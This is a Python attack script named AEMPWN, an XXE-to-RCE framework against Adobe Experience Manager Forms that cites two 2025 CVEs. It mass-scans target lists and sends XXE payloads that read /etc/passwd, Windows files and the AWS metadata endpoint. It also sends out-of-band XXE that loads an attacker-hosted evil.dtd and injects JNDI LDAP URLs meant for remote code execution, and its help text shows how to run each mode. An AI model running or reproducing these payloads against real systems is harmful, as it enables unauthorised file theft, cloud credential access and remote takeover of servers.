#!/usr/bin/env python3

import argparse, requests, sys, re, time, hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BOLD = Style.BRIGHT
RESET = Style.RESET_ALL

TIMEOUT = 10
DEFAULT_OUT = "aempwn-results.txt"

AEM_ENDPOINTS = [
    "/content/forms/af/submit",
    "/services/SubmitForm",
    "/bin/receive",
    "/lc/submit",
    "/lc/content/submit",
]

SAFE_CANARY = "AEMPWN_" + hashlib.sha1(str(time.time()).encode()).hexdigest()[:10]
SAFE_CANARY_PAYLOAD = f"<request><probe>{SAFE_CANARY}</probe></request>"

XXE_PROBES = {
    "linux_hostname": """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<request><probe>&xxe;</probe></request>""",

    "linux_passwd": """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<request><probe>&xxe;</probe></request>""",

    "windows_ini": """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<request><probe>&xxe;</probe></request>""",

    "aws_metadata": """<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/hostname"> ]>
<request><probe>&xxe;</probe></request>""",
}


def banner():
    print(RED + r"""
 █████╗ ███████╗███╗   ███╗██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔══██╗██║    ██║████╗  ██║
███████║█████╗  ██╔████╔██║██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║███╗██║██║╚██╗██║
██║  ██║███████╗██║ ╚═╝ ██║██║     ╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
   by Dividesbyzer0
   CVE-2025-54253  |  CVE-2025-54254
   Adobe Experience Manager Forms XXE → RCE Framework
""" + RESET)

def normalize(t):
    return t.rstrip("/") if t.startswith("http") else "https://" + t.rstrip("/")

def post(url, body):
    return requests.post(
        url,
        data=body,
        headers={"Content-Type": "application/xml"},
        timeout=TIMEOUT,
        verify=False,
        allow_redirects=False,
    )

def looks_like_leak(text: str) -> bool:
    if not text:
        return False
    t = text.strip()
    # Too big = almost certainly framework error page
    if len(t) > 200:
        return False
    low = t.lower()
    # Generic structured response killers (not vendor-specific)
    BLOCKERS = (
        "<html",
        "<!doctype",
        "<?xml",
        "<error",
        "fault",
        "exception",
        "access denied",
        "not found",
        "forbidden",
        "method not allowed",
        "{",
        "}",
    )
    if any(b in low for b in BLOCKERS):
        return False
    # Common real file leak patterns
    # hostnames, container names, short config values, passwd lines, env-style
    SIMPLE_FILE_PATTERNS = [
        r"^[a-zA-Z0-9][a-zA-Z0-9\-\.]{2,40}$",         # hostname
        r"^ip-\d+-\d+-\d+-\d+$",                     # AWS style hostname
        r"^[a-zA-Z0-9_\-]+$",                        # simple token/string
        r"^[^:]+:[^:]*:\d+:\d+:",                    # /etc/passwd line
        r"^[A-Z_]+=.+$",                             # ENV=value
    ]
    for p in SIMPLE_FILE_PATTERNS:
        if re.match(p, t):
            return True
    return False


def behavior_probe(url):
    try:
        r = post(url, SAFE_CANARY_PAYLOAD)
        return SAFE_CANARY in (r.text or "")
    except:
        return False

def write_hit(out, base, items):
    with open(out, "a", encoding="utf-8") as f:
        f.write(base + "\n")
        for i in items:
            f.write(f" {i}\n")
        f.write("\n")

def scan_target(target, oob_url, rce_ldap, verbose):
    base = normalize(target)
    hits = []
    score = 0
    surface = False

    for ep in AEM_ENDPOINTS:
        url = base + ep

        if behavior_probe(url):
            surface = True
            hits.append(f"Unsafe XML parser surface at {ep}")
            score += 1

        for name, payload in XXE_PROBES.items():
            try:
                r = post(url, payload)
                leak = r.text
                if looks_like_leak(leak):
                    hits.append(f"XXE {name} leak at {ep}: {leak.strip()}")
                    score += 3
            except:
                pass
        
        if oob_url:
            try:
                post(url, f"""<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY % remote SYSTEM "{oob_url}/evil.dtd"> %remote; ]>
<request><probe>ok</probe></request>""")
            except:
                pass

        if rce_ldap:
            try:
                post(url, f"""<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY % remote SYSTEM "{rce_ldap}"> %remote; ]>
<request><probe>ok</probe></request>""")
            except:
                pass


    if not surface and score == 0:
        if verbose:
            print(f"{GREEN}[-] {base} no signals{RESET}")
        return False, base, []

    if oob_url:
        hits.append(f"OOB XXE payload sent → {oob_url}/evil.dtd (check listener)")
        score += 2

    if rce_ldap:
        hits.append(f"JNDI RCE payload sent → {rce_ldap} (check LDAP listener)")
        score += 5

    print(f"{BOLD}{RED}[+] {base} VULNERABLE score={score}{RESET}")
    for h in hits:
        print(f"{RED} {h}{RESET}")

    return True, base, hits

def scan_file(path, threads, oob_url, rce_ldap, verbose, out):
    with open(path) as f:
        targets = [l.strip() for l in f if l.strip()]

    print(f"[*] Loaded {len(targets)} targets | threads={threads}\n")

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(scan_target, t, oob_url, rce_ldap, verbose) for t in targets]
        for fut in as_completed(futures):
            ok, base, hits = fut.result()
            if ok:
                write_hit(out, base, hits)

def main():
    banner()

    parser = argparse.ArgumentParser(
        description="AEMPWN - AEM Forms XXE → RCE scanner for CVE-2025-54253 & CVE-2025-54254",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single target safe detection:
    python aempwn.py -u https://target.com

  Mass scan with threading:
    python aempwn.py -f hosts.txt -t 20

  Blind XXE exfil:
    python aempwn.py -f hosts.txt --oob http://abc.oastify.com

  RCE escalation (JNDI):
    python aempwn.py -u target.com --rce ldap://1.2.3.4:1389/#Exploit

Notes:
  --oob requires hosting evil.dtd
  --rce requires LDAP listener (marshalsec, etc)
"""
    )

    parser.add_argument("-u", "--url", help="Single target (domain or full URL)")
    parser.add_argument("-f", "--file", help="File with targets (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Thread count (default 10)")
    parser.add_argument("--oob", type=str, help="OOB XXE mode — base URL hosting evil.dtd (ex: http://your.oastify.com)")
    parser.add_argument("--rce", type=str, help="RCE JNDI mode — LDAP URL (ex: ldap://server:1389/#Exploit)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--out", default=DEFAULT_OUT, help=f"Output file (default: {DEFAULT_OUT})")

    args = parser.parse_args()

    if args.oob and args.rce:
        print(f"{RED}[-] Use either --oob or --rce, not both{RESET}")
        sys.exit(1)

    oob_url = args.oob
    rce_ldap = args.rce

    if args.oob and not oob_url:
        print(f"{RED}[-] --oob requires a URL{RESET}")
        sys.exit(1)

    if args.rce and not rce_ldap:
        print(f"{RED}[-] --rce requires an LDAP URL{RESET}")
        sys.exit(1)

    if args.url:
        ok, base, hits = scan_target(args.url, oob_url, rce_ldap, args.verbose)
        if ok:
            write_hit(args.out, base, hits)
        return

    if args.file:
        scan_file(args.file, args.threads, oob_url, rce_ldap, args.verbose, args.out)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
